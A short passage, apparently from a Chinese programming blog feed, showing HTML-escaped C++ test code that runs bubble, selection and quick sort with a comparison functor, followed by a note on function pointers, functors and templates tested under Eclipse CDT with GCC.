bubblesort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); //  traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); selectsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); //  traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); quicksort(A, 0, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); }   上面的函数有C风格的函数指针与C&#43;&#43;风格函数子（Functor，有时也叫函数对象），函数使用了C&#43;&#43;中模板的一些特性，测试环境为eclipse&#43;cdt&#43;gcc。
 </content>
     </entry>
     
